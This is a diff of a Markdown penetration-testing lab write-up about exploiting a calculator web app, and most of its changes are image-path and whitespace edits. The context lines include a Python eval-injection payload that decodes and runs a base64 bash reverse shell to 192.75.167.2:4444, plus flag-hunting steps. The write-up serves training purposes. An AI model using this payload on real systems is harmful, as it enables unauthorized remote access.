@@ -49,7 +49,7 @@ There's also a Git repository and an online calculator. So probably the project 
 
 ![](<../../../../.gitbook/assets/image (37) (1) (1).png>)
 
-According to this [article](https://testdriven.io/blog/what-is-werkzeug/):&#x20;
+According to this [article](https://testdriven.io/blog/what-is-werkzeug/):
 
 > Werkzeug is a collection of libraries that can be used to create a WSGI (Web Server Gateway Interface) compatible web application in Python.
 >
@@ -99,7 +99,7 @@ Nothing interesting on port 5000 either
 
 Now we have something interesting!
 
-![](<../../../../.gitbook/assets/image (41) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (41) (1) (1) (1) (1).png>)
 
 We are presented with an intereactive console where we can execute python expressions, but the console seems to be protected by a PIN
 
@@ -109,7 +109,7 @@ It doesn't allow unauthenticated access and so far we haven't found a PIN number
 
 Thinking about the credentials we do have and the direction we're trying to go, let's take another look at that config file
 
-![](<../../../../.gitbook/assets/image (24) (1).png>)
+![](<../../../../.gitbook/assets/image (24) (1) (1).png>)
 
 Is there any chance we could get access to that? Can we clone the repository using Git?
 
@@ -127,7 +127,7 @@ However we're more interested in this .git folder
 
 ![](<../../../../.gitbook/assets/image (16) (1) (1).png>)
 
-![](<../../../../.gitbook/assets/image (54) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (54) (1) (1) (1) (1) (1).png>)
 
 Quite a bit of stuff to look through, but I'm sure we'll find something we need to get access to that console
 
@@ -153,7 +153,7 @@ Let's check the other commit difference
 git diff 4bcfb590014321deb984237da2a319206975170f 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd
 ```
 
-![](<../../../../.gitbook/assets/image (20) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (20) (1) (1) (1).png>)
 
 Essentially what was added seems to be user-input sanitation via the isValid function
 
@@ -218,12 +218,11 @@ Here's the payload we'll use:
 __import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNzUuMTY3LjIvNDQ0NCAwPiYxIgo= | base64 -d | bash")
 ```
 
-The above payload decodes the base64 encoded payload we created earlier and passes it to`bash`for executing the reverse shell payload.&#x20;
+The above payload decodes the base64 encoded payload we created earlier and passes it to`bash`for executing the reverse shell payload.
 
 Since our payload will be executed by the`eval`function in Python, we have to import Python's`os`module to execute the desired commands
 
-Now we'll paste the payload in the textbox of the calculator webapp and press the`=`button to execute the payload to the backend\
-
+Now we'll paste the payload in the textbox of the calculator webapp and press the`=`button to execute the payload to the backend\\
 
 ![](<../../../../.gitbook/assets/image (50) (1) (1).png>)
 
@@ -241,7 +240,7 @@ find / -name flag
 
 ![](<../../../../.gitbook/assets/image (9) (1) (1).png>)
 
-![3b2b474c06380f696b38c1498f795e054374](<../../../../.gitbook/assets/image (22) (1) (1) (1).png>)
+![3b2b474c06380f696b38c1498f795e054374](<../../../../.gitbook/assets/image (22) (1) (1) (1) (1).png>)
 
 The shell that we have is pretty limited, so it would be in our best interest to gain a meterpreter shell
 
@@ -362,7 +361,7 @@ The provided machine is reachable.
 nmap -sS -sV online-calc.com
 ```
 
-![3](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/3.png)![3\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/3\_1.png)
+![3](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/3.png) ![3\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/3\_1.png)
 
 On the provided machine, ports 80, 5000 and 8000 are open.
 
